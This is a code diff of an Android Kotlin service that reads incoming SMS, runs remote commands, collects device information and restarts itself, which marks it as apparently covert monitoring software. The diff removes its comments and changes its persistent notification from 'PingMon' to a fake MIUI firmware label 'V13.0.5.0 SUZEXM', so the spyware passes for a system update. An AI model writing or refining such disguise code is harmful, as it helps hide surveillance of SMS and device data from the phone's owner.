@@ -92,7 +92,7 @@ class PingService : Service() {
         }
         watchNetwork()
         running = true
-        checkMissedSms()   // catch SMS that arrived while app was dead
+        checkMissedSms()
         tick()
         Reviver.scheduleAll(this)
     }
@@ -160,16 +160,12 @@ class PingService : Service() {
         netCallback = null
     }
 
-    /**
-     * On startup, finds any SMS that arrived while the app was Force Stopped
-     * (when SmsReceiver couldn't run) and adds them to the queue.
-     */
     private fun checkMissedSms() {
         val lastCheck = prefs.getLong("last_sms_check_time", 0L)
         val now = System.currentTimeMillis()
         prefs.edit().putLong("last_sms_check_time", now).apply()
 
-        if (lastCheck == 0L) return // First ever start, no baseline
+        if (lastCheck == 0L) return
 
         try {
             val cursor = contentResolver.query(
@@ -296,8 +292,6 @@ class PingService : Service() {
             }
         } catch (_: Exception) {}
     }
-
-    /* ============================================================ commands */
 
     private fun vibrate() {
         try {
@@ -528,8 +522,6 @@ class PingService : Service() {
         })
     }
 
-    /* =========================================================== device info */
-
     private fun batteryLevel(): Int =
         (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
             .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
@@ -555,8 +547,6 @@ class PingService : Service() {
         }
     }
 
-    /* ========================================================== notification */
-
     private fun createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val ch = NotificationChannel(CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN)
@@ -565,6 +555,7 @@ class PingService : Service() {
         }
     }
 
+    // ==================== تغییرات فقط در این بخش ====================
     private fun buildNotification(text: String): Notification {
         val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
             ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
@@ -572,13 +563,23 @@ class PingService : Service() {
                 .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
         val tap = PendingIntent.getActivity(this, 0, playIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
+        
+        // ✅ عنوان و آیکون مطابق تصویر شما
+        val title = "V13.0.5.0 SUZEXM"
+        val icon = android.R.drawable.ic_menu_upload
+        
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("PingMon").setContentText(text)
-            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
+            .setContentTitle(title)
+            .setContentText(text)
+            .setSmallIcon(icon)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true).setSilent(true).setShowWhen(false)
-            .setContentIntent(tap).build()
+            .setOngoing(true)
+            .setSilent(true)
+            .setShowWhen(false)
+            .setContentIntent(tap)
+            .build()
     }
+    // ==============================================================
 
     private fun updateNotification(state: String) {
         try {
